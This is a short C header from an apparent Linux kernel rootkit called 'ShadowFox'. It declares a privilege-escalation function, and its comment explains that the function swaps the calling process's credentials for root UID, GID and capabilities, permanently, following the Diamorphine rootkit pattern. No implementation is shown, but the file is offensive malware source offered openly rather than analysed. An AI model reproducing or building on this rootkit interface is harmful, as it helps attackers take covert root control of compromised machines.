/* SPDX-License-Identifier: GPL-2.0 */
#ifndef _SHADOWFOX_CRED_H
#define _SHADOWFOX_CRED_H

/*
 * Privilege-escalation API.
 *
 * sf_escalate_current() swaps the calling task's struct cred for a
 * duplicate whose UID/GID and capability sets have been stomped to
 * root values. Must be called in process context from a syscall path
 * (or any other context where `current` is the task to elevate).
 *
 * Once committed the elevation is permanent for the process's
 * lifetime — there is no de-escalation path, matching the
 * Diamorphine pattern. To "revert" the user simply exits the
 * elevated process.
 *
 * Returns 0 on success or a negative errno on cred-allocation
 * failure.
 */
int sf_escalate_current(void);

#endif /* _SHADOWFOX_CRED_H */
